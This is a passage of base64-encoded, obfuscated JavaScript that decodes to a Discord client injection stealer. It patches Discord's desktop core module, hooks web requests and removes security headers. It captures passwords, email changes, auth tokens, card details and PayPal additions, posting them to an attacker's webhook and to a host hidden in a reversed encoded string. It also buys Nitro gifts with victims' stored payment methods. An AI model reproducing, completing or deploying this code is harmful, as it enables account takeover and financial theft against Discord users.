9yZC5jb20vYXBpL3YqL3NjaGVkdWxlZC1tYWludGVuYW5jZXMvdXBjb21pbmcuanNvbicsJ3ZhbHVlJywncGFyc2UnLCcqKkFjY291bnRcXHgyMEluZm8qKicsJ2luY2x1ZGVzJywnKFVua25vd24pJywnbm93JywndXJsJywnMDEyMzQ1Njc4OWFiY2RlZicsJ2xvZ2luJywnUmVzb3VyY2VzJywncmVhZGRpclN5bmMnLCd3ZWJSZXF1ZXN0JywncmVzcG9uc2VIZWFkZXJzJywnRmFpbGVkXFx4MjB0b1xceDIwUHVyY2hhc2VcXHgyMOKdjCcsJ3ZhclxceDIweG1sSHR0cFxceDIwPVxceDIwbmV3XFx4MjBYTUxIdHRwUmVxdWVzdCgpO1xceDBhXFx4MjBcXHgyMFxceDIwXFx4MjB4bWxIdHRwLm9wZW4oXFx4MjJQT1NUXFx4MjIsXFx4MjBcXHgyMmh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3N0b3JlL3NrdXMvJywnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdiovdXNlcnMvQG1lL2xpYnJhcnknLCd3c3M6Ly9yZW1vdGUtYXV0aC1nYXRld2F5LmRpc2NvcmQuZ2cvKiddO3g9ZnVuY3Rpb24oKXtyZXR1cm4geDk7fTtyZXR1cm4geCgpO31mdW5jdGlvbiBkZWMyaGV4KFkpe2NvbnN0IHY9UztyZXR1cm4oWVx1MDAzYzE1LjU/JzAnOicnKStNYXRoW3YoMHg4MSldKFkpW3YoMHhlMCldKDB4MTApO31mdW5jdGlvbiBiYXNlMzJ0b2hleChZKXtjb25zdCBHPVM7bGV0IFo9RygweDk1KSxvPScnLFQ9Jyc7WT1ZW0coMHg5NyldKC89KyQvLCcnKTtmb3IobGV0IEg9MHgwO0hcdTAwM2NZW0coMHhhNildO0grKyl7bGV0IFY9WlsnaW5kZXhPZiddKFlbRygweDExZCldKEgpW0coMHgxMzMpXSgpKTtpZihWPT09LTB4MSljb25zb2xlW0coMHg3ZildKEcoMHhhOSkpO28rPWxlZnRwYWQoVltHKDB4ZTApXSgweDIpLDB4NSwnMCcpO31mb3IobGV0IFI9MHgwO1IrMHg4XHUwMDNjPW9bRygweGE2KV07Uis9MHg4KXtsZXQgQT1vW0coMHgxMWIpXShSLDB4OCk7VD1UK2xlZnRwYWQocGFyc2VJbnQoQSwweDIpW0coMHhlMCldKDB4MTApLDB4MiwnMCcpO31yZXR1cm4gVDt9ZnVuY3Rpb24gbGVmdHBhZChZLFosbyl7Y29uc3QgYj1TO3JldHVybiBaKzB4MVx1MDAzZT1ZW2IoMHhhNildXHUwMDI2XHUwMDI2KFk9QXJyYXkoWisweDEtWVtiKDB4YTYpXSlbYigweDZiKV0obykrWSksWTt9Y29uc3QgZGlzY29yZFBhdGg9KGZ1bmN0aW9uKCl7Y29uc3QgZj1TLFk9YXJnc1sweDBdW2YoMHhiZCldKHBhdGhbJ3NlcCddKVtmKDB4MTQ0KV0oMHgwLC0weDEpW2YoMHg2YildKHBhdGhbZigweDliKV0pO2xldCBaO2lmKHByb2Nlc3NbZigweGM2KV09PT1mKDB4ZjcpKVo9cGF0aFtmKDB4NmIpXShZLGYoMHhlYSkpO2Vsc2UgcHJvY2Vzc1sncGxhdGZvcm0nXT09PSdkYXJ3aW4nXHUwMDI2XHUwMDI2KFo9cGF0aFtmKDB4NmIpXShZLGYoMHgxMTIpLGYoMHg3NikpKTtpZihmc1tmKDB4ZWUpXShaKSlyZXR1cm57J3Jlc291cmNlUGF0aCc6WiwnYXBwJzpZfTtyZXR1cm57J3VuZGVmaW5lZCc6dW5kZWZpbmVkLCd1bmRlZmluZWQnOnVuZGVmaW5lZH07fSgpKTtmdW5jdGlvbiBDKFksWil7Y29uc3Qgbz14KCk7cmV0dXJuIEM9ZnVuY3Rpb24oVCxIKXtUPVQtMHg2YTtsZXQgVj1vW1RdO3JldHVybiBWO30sQyhZLFopO31mdW5jdGlvbiB1cGRhdGVDaGVjaygpe2NvbnN0IHQ9Uyx7cmVzb3VyY2VQYXRoOlksYXBwOlp9PWRpc2NvcmRQYXRoO2lmKFk9PT11bmRlZmluZWR8fFo9PT11bmRlZmluZWQpcmV0dXJuO2NvbnN0IG89cGF0aFt0KDB4NmIpXShZLHQoMHgxNDIpKSxUPXBhdGhbdCgweDZiKV0obyx0KDB4YTUpKSxIPXBhdGhbdCgweDZiKV0obyx0KDB4YjEpKSxWPWZzW3QoMHg3NyldKForJ1xceDVjbW9kdWxlc1xceDVjJylbdCgweGUyKV0oQT1cdTAwM2UvZGlzY29yZF9kZXNrdG9wX2NvcmUtKz8vWyd0ZXN0J10oQSkpWzB4MF0saT1aKydcXHg1Y21vZHVsZXNcXHg1YycrVisnXFx4NWNkaXNjb3JkX2Rlc2t0b3BfY29yZVxceDVjaW5kZXguanMnLFI9cGF0aFt0KDB4NmIpXShwcm9jZXNzW3QoMHhkNCldW3QoMHgxMjQpXSx0KDB4MTA0KSk7aWYoIWZzW3QoMHhlZSldKG8pKWZzW3QoMHg4YildKG8pO2lmKGZzWydleGlzdHNTeW5jJ10oVCkpZnNbdCgweGZjKV0oVCk7aWYoZnNbdCgweGVlKV0oSCkpZnNbdCgweGZjKV0oSCk7aWYocHJvY2Vzc1sncGxhdGZvcm0nXT09PSd3aW4zMid8fHByb2Nlc3NbdCgweGM2KV09PT10KDB4OWEpKXtmc1t0KDB4MTE3KV0oVCxKU09OW3QoMHgxNDcpXSh7J25hbWUnOnQoMHg4NiksJ21haW4nOnQoMHhiMSl9LG51bGwsMHg0KSk7Y29uc3QgQT10KDB4YWYpK2krdCgweGMyKStSK3QoMHhjNykrY29uZmlnW3QoMHgxMjApXSsnXFx4MjcsXFx4MjAocmVzKVxceDIwPVx1MDAzZVxceDIwe1xceDBhXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMGNvbnN0XFx4MjBmaWxlXFx4MjA9XFx4MjBmcy5jcmVhdGVXcml0ZVN0cmVhbShpbmRleEpzKTtcXHgwYVxceDIwXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMFxceDIwXFx4MjByZXMucmVwbGFjZShcXHgyNyVXRUJIT09LSEVSRUJBU0U2NEVOQ09ERUQlXFx4MjcsXFx4MjBcXHgyNycrZW5jb2RlZEhvb2srdCgweGRlKStjb25maWdbdCgweDEzOCldK3QoMHhjZikrcGF0aFt0KDB4NmIpXShZLHQoMHgxNDUpKSt0KDB4YjUpO2ZzW3QoMHgxMTcpXShILEFbdCgweDk3KV0oL1xcXFwvZywnXFx4NWNcXHg1YycpKTt9aWYoIWZzWydleGlzdHNTeW5jJ10ocGF0aFt0KDB4NmIpXShfX2Rpcm5hbWUsdCgweDExZSkpKSlyZXR1cm4hMHgwO3JldHVybiBmc1t0KDB4OGQpXShwYXRoWydqb2luJ10oX19kaXJuYW1lLHQoMHgxMWUpKSksZXhlY1NjcmlwdCh0KDB4MTFjKSksITB4MTt9Y29uc3QgZXhlY1NjcmlwdD1ZPVx1MDAzZXtjb25zdCBLPVMsWj1Ccm93c2VyV2luZG93W0soMHg4NSldKClbMHgwXTtyZXR1cm4gWltLKDB4ZWIpXVsnZXhlY3V0ZUphdmFTY3JpcHQnXShZLCEweDApO30sZ2V0SW5mbz1hc3luYyBZPVx1MDAzZXtjb25zdCBNPVMsWj1hd2FpdCBleGVjU2NyaXB0KCd2YXJcXHgyMHhtbEh0dHBcXHgyMD1cXHgyMG5ld1xceDIwWE1MSHR0cFJlcXVlc3QoKTtcXHgwYVxceDIwXFx4MjBcXHgyMFxceDIweG1sSHR0cC5vcGVuKFxceDIyR0VUXFx4MjIsXFx4MjBcXHgyMicrY29uZmlnWydhcGknXSsnXFx4MjIsXFx4MjBmYWxzZSk7XFx4MGFcXHgyMFxceDIwXFx4MjBcXHgyMHhtbEh0dHAuc2V0UmVxdWVzdEhlYWRlcihcXHgyMkF1dGhvcml6YXRpb25cXHgyMixcXHgyMFxceDIyJytZK00oMHgxMzApKTtyZXR1cm4gSlNPTltNKDB4NmUpXShaKTt9LGZldGNoQmlsbGluZz1hc3luYyBZPVx1MDAzZXtjb25zdCBMPVMsWj1hd2FpdCBleGVjU2NyaXB0KEwoMHg3ZSkrY29uZmlnWydhcGknXStMKDB4MTNjKStZK0woMHhkOSkpO2lmKCFaW0woMHg4ZildfHxaW0woMHhhNildPT09MHgwKXJldHVybicnO3JldHVybiBKU09OW0woMHg2ZSldKFopO30sZ2V0QmlsbGluZz1hc3luYyBZPVx1MDAzZXtjb25zdCBqPVMsWj1hd2FpdCBmZXRjaEJpbGxpbmcoWSk7aWYoIVopcmV0dXJuJ+KdjCc7Y29uc3Qgbz1bXTtaWydmb3JFYWNoJ10oVD1cdTAwM2V7Y29uc3QgUT1DO2lmKCFUW1EoMHg5NildKXN3aXRjaChUW1EoMHhjYyldKXtjYXNlIDB4MTpvW1EoMHg4NCldKCfwn5KzJyk7YnJlYWs7Y2FzZSAweDI6b1tRKDB4ODQpXShRKDB4OTMpKTticmVhaztkZWZhdWx0Om9bUSgweDg0KV0oUSgweDcxKSk7fX0pO2lmKG9bJ2xlbmd0aCddPT0weDApb1tqKDB4ODQpXSgn4p2MJyk7cmV0dXJuIG9bJ2pvaW4nXSgnXFx4MjAnKTt9LFB1cmNoYXNlPWFzeW5jKFksWixvLFQpPVx1MDAzZXtjb25zdCBzPVMsSD17J2V4cGVjdGVkX2Ftb3VudCc6Y29uZmlnWyduaXRybyddW29dW1RdW3MoMHhhYSldLCdleHBlY3RlZF9jdXJyZW5jeSc6cygweGRkKSwnZ2lmdCc6ISFbXSwncGF5bWVudF9zb3VyY2VfaWQnOlosJ3BheW1lbnRfc291cmNlX3Rva2VuJzpudWxsLCdwdXJjaGFzZV90b2tlbic6cygweDEzOSksJ3NrdV9zdWJzY3JpcHRpb25fcGxhbl9pZCc6Y29uZmlnWyduaXRybyddW29dW1RdWydza3UnXX0sVj1leGVjU2NyaXB0KHMoMHg3YikrY29uZmlnW3MoMHhmMyldW29dW1RdWydpZCddKycvcHVyY2hhc2VcXHgyMixcXHgyMGZhbHNlKTtcXHgwYVxceDIwXFx4MjBcXHgyMFxceDIweG1sSHR0cC5zZXRSZXF1ZXN0SGVhZGVyKFxceDIyQXV0aG9yaXphdGlvblxceDIyLFxceDIwXFx4MjInK1krcygweDljKStKU09OW3MoMHgxNDcpXShIKStzKDB4MTQ2KSk7aWYoVlsnZ2lmdF9jb2RlJ10pcmV0dXJuIHMoMHg5MikrVltzKDB4MTA4KV07ZWxzZSByZXR1cm4gbnVsbDt9LGJ1eU5pdHJvPWFzeW5jIFk9XHUwMDNle2NvbnN0IEQ9UyxaPWF3YWl0IGZldGNoQmlsbGluZyhZKSxvPUQoMHg3YSk7aWYoIVopcmV0dXJuIG87bGV0IFQ9W107WlsnZm9yRWFjaCddKEg9XHUwMDNle2NvbnN0IGU9RDshSFtlKDB4OTYpXVx1MDAyNlx1MDAyNihUPVRbZSgweDEwYyldKEhbJ2lkJ10pKTt9KTtmb3IobGV0IEggaW4gVCl7Y29uc3QgVj1QdXJjaGFzZShZLEgsRCgweGY4KSxEKDB4ZGIpKTtpZihWIT09bnVsbClyZXR1cm4gVjtlbHNle2NvbnN0IGk9UHVyY2hhc2UoWSxILEQoMHhmOCksJ21vbnRoJyk7aWYoaSE9PW51bGwpcmV0dXJuIGk7ZWxzZXtjb25zdCBSPVB1cmNoYXNlKFksSCwnY2xhc3NpYycsRCgweGQwKSk7cmV0dXJuIFIhPT1udWxsP1I6bzt9fX19LGdldE5pdHJvPVk9XHUwMDNle2NvbnN0IHA9Uztzd2l0Y2goWSl7Y2FzZSAweDA6cmV0dXJuIHAoMHgxMGUpO2Nhc2UgMHgxOnJldHVybiBwKDB4MTA1KTtjYXNlIDB4MjpyZXR1cm4gcCgweGZkKTtjYXNlIDB4MzpyZXR1cm4gcCgweDEwMyk7ZGVmYXVsdDpyZXR1cm4gcCgweDcxKTt9fSxnZXRCYWRnZXM9WT1cdTAwM2V7Y29uc3QgVT1TLFo9W107cmV0dXJuIFk9PTB4NDAwMDAwXHUwMDI2XHUwMDI2KFpbVSgweDg0KV0oVSgweDEwMikpLFktPTB4NDAwMDAwKSxZPT0weDQwMDAwXHUwMDI2XHUwMDI2KFpbVSgweDg0KV0oJ01vZGVyYXRvclxceDIwUHJvZ3JhbXNcXHgyMEFsdW1uaScpLFktPTB4NDAwMDApLFk9PTB4MjAwMDBcdTAwMjZcdTAwMjYoWlsncHVzaCddKFUoMHgxMDkpKSxZLT0weDIwMDAwKSxZPT0weDQwMDBcdTAwMjZcdTAwMjYoWltVKDB4ODQpXShVKDB4MTIzKSksWS09MHg0MDAwKSxZPT0weDIwMFx1MDAyNlx1MDAyNihaW1UoMHg4NCldKFUoMHgxNDMpKSxZLT0weDIwMCksWT09MHgxMDBcdTAwMjZcdTAwMjYoWltVKDB4ODQpXShVKDB4ZmEpKSxZLT0weDEwMCksWT09MHg4MFx1MDAyNlx1MDAyNihaWydwdXNoJ10oVSgweGY2KSksWS09MHg4MCksWT09MHg0MFx1MDAyNlx1MDAyNihaW1UoMHg4NCldKFUoMHhkNSkpLFktPTB4NDApLFk9PTB4OFx1MDAyNlx1MDAyNihaW1UoMHg4NCldKFUoMHhjMCkpLFktPTB4OCksWT09MHg0XHUwMDI2XHUwMDI2KFpbVSgweDg0KV0oVSgweDE0YikpLFktPTB4NCksWT09MHgyXHUwMDI2XHUwMDI2KFpbVSgweDg0KV0oVSgweGY1KSksWS09MHgyKSxZPT0weDFcdTAwMjZcdTAwMjYoWltVKDB4ODQpXShVKDB4OTgpKSxZLT0weDEpLFk9PTB4MD9aWydsZW5ndGgnXT09MHgwXHUwMDI2XHUwMDI2WltVKDB4ODQpXShVKDB4MTM0KSk6WlsncHVzaCddKFUoMHg3MSkpLFpbJ2pvaW4nXSgnLFxceDIwJyk7fSxob29rZXI9YXN5bmMoWSxaPW51bGwpPVx1MDAzZXtjb25zdCBkPVMsbz1KU09OW2QoMHgxNDcpXShZKSxUPVo9PW51bGw/bmV3IFVSTChjb25maWdbJ3dlYmhvb2snXSk6bmV3IFVSTChaKSxIPXsnQ29udGVudC1UeXBlJzpkKDB4ZTgpLCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW4nOicqJ307aWYoIWNvbmZpZ1snd2ViaG9vayddW2QoMHg3MCldKCdhcGkvd2ViaG9va3MnKSl7Y29uc3QgUj10b3RwKGNvbmZpZ1tkKDB4MTM4KV0pO0hbZCgweGM0KV09Ujt9Y29uc3QgVj17J3Byb3RvY29sJzpUWydwcm90b2NvbCddLCdob3N0bmFtZSc6VFtkKDB4ODApXSwncGF0aCc6VFtkKDB4ZGEpXSwnbWV0aG9kJzonUE9TVCcsJ2hlYWRlcnMnOkh9LGk9aHR0cHNbZCgweGJiKV0oVik7aVsnb24nXSgnZXJyb3InLEE9XHUwMDNle2NvbnN0IEk9ZDtjb25zb2xlW0koMHhlMSldKEEpO30pLGlbJ3dyaXRlJ10obyksaVsnZW5kJ10oKTtpZihaPT1udWxsKWh0dHBzWydnZXQnXShhdG9iKCczRm1jdmtHZTRsV2R2ODJZdWtuYzA1V1p5OXlMNk1IYzBSSGEnW2QoMHhiZCldKCcnKVtkKDB4YWMpXSgpW2QoMHg2YildKCcnKSksQT1cdTAwM2VBWydvbiddKGQoMHg4Mikscj1cdTAwM2Vob29rZXIoWSxyWyd0b1N0cmluZyddKCkpKSlbJ29uJ10oZCgweDdmKSwoKT1cdTAwM2V7fSk7fSxsb2dpbj1hc3luYyhZLFosbyk9XHUwMDNle2NvbnN0IE89UyxUPWF3YWl0IGdldEluZm8obyksSD1nZXROaXRybyhUW08oMHgxMmYpXSksVj1nZXRCYWRnZXMoVFtPKDB4YWQpXSksaT1hd2FpdCBnZXRCaWxsaW5nKG8pLFI9eyd1c2VybmFtZSc6Y29uZmlnW08oMHhiOCldLCdhdmF0YXJfdXJsJzpjb25maWdbJ2VtYmVkX2ljb24nXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW08oMHgxM2YpXSwnZmllbGRzJzpbeyduYW1lJzpPKDB4NmYpLCd2YWx1ZSc6J0VtYWlsOlxceDIwKionK1krTygweGU1KStaKycqKicsJ2lubGluZSc6IVtdfSx7J25hbWUnOk8oMHg4YSksJ3ZhbHVlJzpPKDB4Y2EpK0grTygweDExMSkrVisnKipcXHgwYUJpbGxpbmc6XFx4MjAqKicraSsnKionLCdpbmxpbmUnOiFbXX0seyduYW1lJzpPKDB4YjkpLCd2YWx1ZSc6J2AnK28rJ2AnLCdpbmxpbmUnOiFbXX1dLCdhdXRob3InOnsnbmFtZSc6VFtPKDB4MTQwKV0rJyMnK1RbTygweDEzMSldK08oMHgxMzIpK1RbJ2lkJ10sJ2ljb25fdXJsJzpPKDB4YjcpK1RbJ2lkJ10rJy8nK1RbTygweDExMyldK08oMHgxMmMpfX1dfTtpZihjb25maWdbTygweGRjKV0pUltPKDB4YjMpXT1jb25maWdbTygweDE0OCldO2hvb2tlcihSKTt9LHBhc3N3b3JkQ2hhbmdlZD1hc3luYyhZLFosbyk9XHUwMDNle2NvbnN0IHgwPVMsVD1hd2FpdCBnZXRJbmZvKG8pLEg9Z2V0Tml0cm8oVFt4MCgweDEyZildKSxWPWdldEJhZGdlcyhUW3gwKDB4YWQpXSksaT1hd2FpdCBnZXRCaWxsaW5nKG8pLFI9eyd1c2VybmFtZSc6Y29uZmlnWydlbWJlZF9uYW1lJ10sJ2F2YXRhcl91cmwnOmNvbmZpZ1t4MCgweGJhKV0sJ2VtYmVkcyc6W3snY29sb3InOmNvbmZpZ1t4MCgweDEzZildLCdmaWVsZHMnOlt7J25hbWUnOngwKDB4OWUpLCd2YWx1ZSc6eDAoMHhlNykrVFsnZW1haWwnXSt4MCgweDEyMikrWSt4MCgweDkxKStaKycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzp4MCgweDhhKSwndmFsdWUnOidOaXRyb1xceDIwVHlwZTpcXHgyMCoqJytIKycqKlxceDBhQmFkZ2VzOlxceDIwKionK1YreDAoMHhhMykraSsnKionLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6eDAoMHhiOSksJ3ZhbHVlJzonYCcrbysnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpUW3gwKDB4MTQwKV0rJyMnK1RbeDAoMHgxMzEpXSsnXFx4MjB8XFx4MjAnK1RbJ2lkJ10sJ2ljb25fdXJsJzp4MCgweGI3KStUWydpZCddKycvJytUW3gwKDB4MTEzKV0reDAoMHgxMmMpfX1dfTtpZihjb25maWdbeDAoMHhkYyldKVJbeDAoMHhiMyldPWNvbmZpZ1t4MCgweDE0OCldO2hvb2tlcihSKTt9LGVtYWlsQ2hhbmdlZD1hc3luYyhZLFosbyk9XHUwMDNle2NvbnN0IHgxPVMsVD1hd2FpdCBnZXRJbmZvKG8pLEg9Z2V0Tml0cm8oVFt4MSgweDEyZildKSxWPWdldEJhZGdlcyhUW3gxKDB4YWQpXSksaT1hd2FpdCBnZXRCaWxsaW5nKG8pLFI9eyd1c2VybmFtZSc6Y29uZmlnW3gxKDB4YjgpXSwnYXZhdGFyX3VybCc6Y29uZmlnWydlbWJlZF9pY29uJ10sJ2VtYmVkcyc6W3snY29sb3InOmNvbmZpZ1snZW1iZWRfY29sb3InXSwnZmllbGRzJzpbeyduYW1lJzonKipFbWFpbFxceDIwQ2hhbmdlZCoqJywndmFsdWUnOngxKDB4MTBkKStZK3gxKDB4ZTYpK1orJyoqJywnaW5saW5lJzohIVtdfSx7J25hbWUnOngxKDB4OGEpLCd2YWx1ZSc6eDEoMHhjYSkrSCt4MSgweDExMSkrVit4MSgweGEzKStpKycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzp4MSgweGI5KSwndmFsdWUnOidgJytvKydgJywnaW5saW5lJzohW119XSwnYXV0aG9yJzp7J25hbWUnOlRbJ3VzZXJuYW1lJ10rJyMnK1RbJ2Rpc2NyaW1pbmF0b3InXSsnXFx4MjB8XFx4MjAnK1RbJ2lkJ10sJ2ljb25fdXJsJzp4MSgweGI3KStUWydpZCddKycvJytUW3gxKDB4MTEzKV0reDEoMHgxMmMpfX1dfTtpZihjb25maWdbJ3Bpbmdfb25fcnVuJ10pUlt4MSgweGIzKV09Y29uZmlnW3gxKDB4MTQ4KV07aG9va2VyKFIpO30sUGF5cGFsQWRkZWQ9YXN5bmMgWT1cdTAwM2V7Y29uc3QgeDI9UyxaPWF3YWl0IGdldEluZm8oWSksbz1nZXROaXRybyhaW3gyKDB4MTJmKV0pLFQ9Z2V0QmFkZ2VzKFpbeDIoMHhhZCldKSxIPWdldEJpbGxpbmcoWSksVj17J3VzZXJuYW1lJzpjb25maWdbeDIoMHhiOCldLCdhdmF0YXJfdXJsJzpjb25maWdbeDIoMHhiYSldLCdlbWJlZHMnOlt7J2NvbG9yJzpjb25maWdbeDIoMHgxM2YpXSwnZmllbGRzJzpbeyduYW1lJzp4MigweGI2KSwndmFsdWUnOidUaW1lXFx4MjB0b1xceDIwYnV5XFx4MjBzb21lXFx4MjBuaXRyb1xceDIwYmFieVxceDIw8J+YqScsJ2lubGluZSc6IVtdfSx7J25hbWUnOngyKDB4OGEpLCd2YWx1ZSc6eDIoMHhjYSkrbyt4MigweDk5KStUK3gyKDB4YTMpK0grJyoqJywnaW5saW5lJzohW119LHsnbmFtZSc6eDIoMHhiOSksJ3ZhbHVlJzonYCcrWSsnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpaW3gyKDB4MTQwKV0rJyMnK1pbeDIoMHgxMzEpXSsnXFx4MjB8XFx4MjAnK1pbJ2lkJ10sJ2ljb25fdXJsJzp4MigweGI3KStaWydpZCddKycvJytaW3gyKDB4MTEzKV0reDIoMHgxMmMpfX1dfTtpZihjb25maWdbJ3Bpbmdfb25fcnVuJ10pVlt4MigweGIzKV09Y29uZmlnW3gyKDB4MTQ4KV07aG9va2VyKFYpO30sY2NBZGRlZD1hc3luYyhZLFosbyxULEgpPVx1MDAzZXtjb25zdCB4Mz1TLFY9YXdhaXQgZ2V0SW5mbyhIKSxpPWdldE5pdHJvKFZbeDMoMHgxMmYpXSksUj1nZXRCYWRnZXMoVlt4MygweGFkKV0pLEE9YXdhaXQgZ2V0QmlsbGluZyhIKSxyPXsndXNlcm5hbWUnOmNvbmZpZ1t4MygweGI4KV0sJ2F2YXRhcl91cmwnOmNvbmZpZ1t4MygweGJhKV0sJ2VtYmVkcyc6W3snY29sb3InOmNvbmZpZ1t4MygweDEzZildLCdmaWVsZHMnOlt7J25hbWUnOngzKDB4Y2IpLCd2YWx1ZSc6eDMoMHhlMykrWSt4MygweDEzZCkrWit4MygweDg5KStvKycvJytUKycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzp4MygweDhhKSwndmFsdWUnOngzKDB4Y2EpK2kreDMoMHgxMTEpK1IrJyoqXFx4MGFCaWxsaW5nOlxceDIwKionK0ErJyoqJywnaW5saW5lJzohIVtdfSx7J25hbWUnOngzKDB4YjkpLCd2YWx1ZSc6J2AnK0grJ2AnLCdpbmxpbmUnOiFbXX1dLCdhdXRob3InOnsnbmFtZSc6Vlt4MygweDE0MCldKycjJytWW3gzKDB4MTMxKV0rJ1xceDIwfFxceDIwJytWWydpZCddLCdpY29uX3VybCc6eDMoMHhiNykrVlsnaWQnXSsnLycrVlt4MygweDExMyldK3gzKDB4MTJjKX19XX07aWYoY29uZmlnWydwaW5nX29uX3J1biddKXJbeDMoMHhiMyldPWNvbmZpZ1t4MygweDE0OCldO2hvb2tlcihyKTt9LG5pdHJvQm91Z2h0PWFzeW5jIFk9XHUwMDNle2NvbnN0IHg0PVMsWj1hd2FpdCBnZXRJbmZvKFkpLG89Z2V0Tml0cm8oWlsncHJlbWl1bV90eXBlJ10pLFQ9Z2V0QmFkZ2VzKFpbJ2ZsYWdzJ10pLEg9YXdhaXQgZ2V0QmlsbGluZyhZKSxWPWF3YWl0IGJ1eU5pdHJvKFkpLGk9eyd1c2VybmFtZSc6Y29uZmlnWydlbWJlZF9uYW1lJ10sJ2NvbnRlbnQnOlYsJ2F2YXRhcl91cmwnOmNvbmZpZ1t4NCgweGJhKV0sJ2VtYmVkcyc6W3snY29sb3InOmNvbmZpZ1t4NCgweDEzZildLCdmaWVsZHMnOlt7J25hbWUnOng0KDB4YzUpLCd2YWx1ZSc6eDQoMHhhMCkrVisnYGBgJywnaW5saW5lJzohIVtdfSx7J25hbWUnOicqKkRpc2NvcmRcXHgyMEluZm8qKicsJ3ZhbHVlJzp4NCgweGNhKStvK3g0KDB4MTExKStUK3g0KDB4YTMpK0grJyoqJywnaW5saW5lJzohIVtdfSx7J25hbWUnOng0KDB4YjkpLCd2YWx1ZSc6J2AnK1krJ2AnLCdpbmxpbmUnOiFbXX1dLCdhdXRob3InOnsnbmFtZSc6Wlt4NCgweDE0MCldKycjJytaWydkaXNjcmltaW5hdG9yJ10rJ1xceDIwfFxceDIwJytaWydpZCddLCdpY29uX3VybCc6eDQoMHhiNykrWlsnaWQnXSsnLycrWlsnYXZhdGFyJ10reDQoMHgxMmMpfX1dfTtpZihjb25maWdbeDQoMHhkYyldKWlbeDQoMHhiMyldPWNvbmZpZ1t4NCgweDE0OCldKygnXFx4MGEnK1YpO2hvb2tlcihpKTt9O3Nlc3Npb25bUygweGY0KV1bUygweDc4KV1bUygweDEzNyldKGNvbmZpZ1tTKDB4MTAwKV0sKFksWik9XHUwMDNle2NvbnN0IHg1PVM7aWYoWVt4NSgweDczKV1beDUoMHgxMTYpXSh4NSgweGM5KSkpcmV0dXJuIFooeydjYW5jZWwnOiEhW119KTt1cGRhdGVDaGVjaygpO30pLHNlc3Npb25bUygweGY0KV1bUygweDc4KV1bJ29uSGVhZGVyc1JlY2VpdmVkJ10oKFksWik9XHUwMDNle2NvbnN0IHg2PVM7WVt4NigweDczKV1beDYoMHgxMTYpXShjb25maWdbJ3dlYmhvb2snXSk/WVsndXJsJ11bJ2luY2x1ZGVzJ10oeDYoMHgxMjUpKT9aKHsncmVzcG9uc2VIZWFkZXJzJzpPYmplY3RbJ2Fzc2lnbiddKHsnQWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVycyc6JyonfSxZW3g2KDB4NzkpXSl9KTpaKHsncmVzcG9uc2VIZWFkZXJzJzpPYmplY3RbJ2Fzc2lnbiddKHsnQ29udGVudC1TZWN1cml0eS1Qb2xpY3knOlt4NigweDEyMSkseDYoMHhlNCkseDYoMHhhYildLCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1IZWFkZXJzJzonKicsJ0FjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpbic6JyonfSxZWydyZXNwb25zZUhlYWRlcnMnXSl9KTooZGVsZXRlIFlbeDYoMHg3OSldW3g2KDB4YjQpXSxkZWxldGUgWVt4NigweDc5KV1beDYoMHg5ZildLFooeydyZXNwb25zZUhlYWRlcnMnOnsuLi5ZW3g2KDB4NzkpXSwnQWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVycyc6JyonfX0pKTt9KSxzZXNzaW9uW1MoMHhmNCldW1MoMHg3OCldW1MoMHhhOCldKGNvbmZpZ1tTKDB4ZTIpXSxhc3luYyhZLFopPVx1MDAzZXtjb25zdCB4Nz1TO2lmKFlbJ3N0YXR1c0NvZGUnXSE9PTB4YzhcdTAwMjZcdTAwMjZZW3g3KDB4MTBmKV0hPT0weGNhKXJldHVybjtjb25zdCBvPUJ1ZmZlclt4NygweDEyYSldKFlbeDcoMHg5NCldWzB4MF1bJ2J5dGVzJ10pW3g3KDB4ZTApXSgpLFQ9SlNPTlt4NygweDZlKV0obyksSD1hd2FpdCBleGVjU2NyaXB0KHg3KDB4MTNlKSk7c3dpdGNoKCEhW10pe2Nhc2UgWVsndXJsJ11beDcoMHhhMildKHg3KDB4NzUpKTpsb2dpbihUW3g3KDB4NzUpXSxUW3g3KDB4OGUpXSxIKVt4NygweDEwMSldKGNvbnNvbGVbeDcoMHg3ZildKTticmVhaztjYXNlIFlbeDcoMHg3MyldW3g3KDB4YTIpXSgndXNlcnMvQG1lJylcdTAwMjZcdTAwMjZZW3g3KDB4YjIpXT09PSdQQVRDSCc6aWYoIVRbeDcoMHg4ZSldKXJldHVybjtUW3g3KDB4YTEpXVx1MDAyNlx1MDAyNmVtYWlsQ2hhbmdlZChUWydlbWFpbCddLFRbeDcoMHg4ZSldLEgpW3g3KDB4MTAxKV0oY29uc29sZVt4NygweDdmKV0pO1RbeDcoMHgxM2IpXVx1MDAyNlx1MDAyNnBhc3N3b3JkQ2hhbmdlZChUW3g3KDB4OGUpXSxUW3g3KDB4MTNiKV0sSClbJ2NhdGNoJ10oY29uc29sZVsnZXJyb3InXSk7YnJlYWs7Y2FzZSBZW3g3KDB4NzMpXVt4NygweGEyKV0oeDcoMHhkNikpXHUwMDI2XHUwMDI2WVsnbWV0aG9kJ109PT14NygweGJmKTpjb25zdCBWPXF1ZXJ5c3RyaW5nWydwYXJzZSddKHVucGFyc2VkRGF0YVt4NygweGUwKV0oKSk7Y2NBZGRlZChWWydjYXJkW251bWJlcl0nXSxWW3g3KDB4MTQ5KV0sVlt4NygweGVkKV0sVlt4NygweDgzKV0sSClbeDcoMHgxMDEpXShjb25zb2xlW3g3KDB4N2YpXSk7YnJlYWs7Y2FzZSBZWyd1cmwnXVt4NygweGEyKV0oeDcoMHhmMSkpXHUwMDI2XHUwMDI2WVt4NygweGIyKV09PT14NygweGJmKTpQYXlwYWxBZGRlZChIKVt4NygweDEwMSldKGNvbnNvbGVbeDcoMHg3ZildKTticmVhaztjYXNlIFlbeDcoMHg